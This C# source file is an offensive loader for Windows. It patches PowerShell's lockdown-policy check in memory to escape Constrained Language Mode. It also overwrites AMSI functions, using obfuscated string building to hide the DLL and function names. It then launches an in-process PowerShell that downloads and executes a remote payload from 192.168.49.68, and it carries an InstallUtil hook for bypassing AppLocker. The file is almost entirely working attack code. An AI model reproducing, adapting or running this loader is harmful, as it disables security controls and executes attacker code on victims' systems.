using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.IO;

namespace loader
{

    public class MainClass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetStdHandle(int nStdHandle);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        public static void Main(string[] args)
        {
            go();
        }

        public static void go()
        {
            // Find a reference to the automation assembly
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            // Get a MethodInfo reference to the GetSystemLockdownPolicy method
            var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            // Retrieve a handle to the method
            var get_lockdown_handle = get_lockdown_info.MethodHandle;
            uint lpflOldProtect;

            // This ensures the method is JIT compiled
            RuntimeHelpers.PrepareMethod(get_lockdown_handle);
            // Get a pointer to the compiled function
            var get_lockdown_ptr = get_lockdown_handle.GetFunctionPointer();

            // Ensure we can write to the address
            VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            // Write the instructions "mov rax, 0; ret". This returns 0, which is the same as returning SystemEnforcementMode.None
            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);

            string[] filePaths = Directory.GetFiles(@"c:\windows\system32", "a?s?.d*");
            string libname = (filePaths[0].Substring(filePaths[0].Length - 8));

            var lib = LoadLibrary(libname);
            Char c1, c2, c3, c4, c5;
            c1 = 'A';
            c2 = 's';
            c3 = 'c';
            c4 = 'n';
            c5 = 'l';
            var baseaddr = GetProcAddress(lib, c1 + "m" + c2 + "iUa" + c3 + "I" + c4 + "itia" + c5 + "ize");
            var funcaddr = baseaddr - 96;
            VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
            Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
            funcaddr = baseaddr - 352;
            VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
            Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);

            // Run powershell from the current process (won't start powershell.exe, but run from the powershell .Net libraries)
            Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] {
                "-exec", "bypass", "-nop", "iex (new-object net.webclient).downloadstring('http://192.168.49.68/payload.txt')",
            });
        }
    }

    // This class is used if you need to load this with InstallUtil to bypass AppLocker.
    // usage: InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\bypass-clm.exe"
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);

            MainClass.go();
        }
    }

}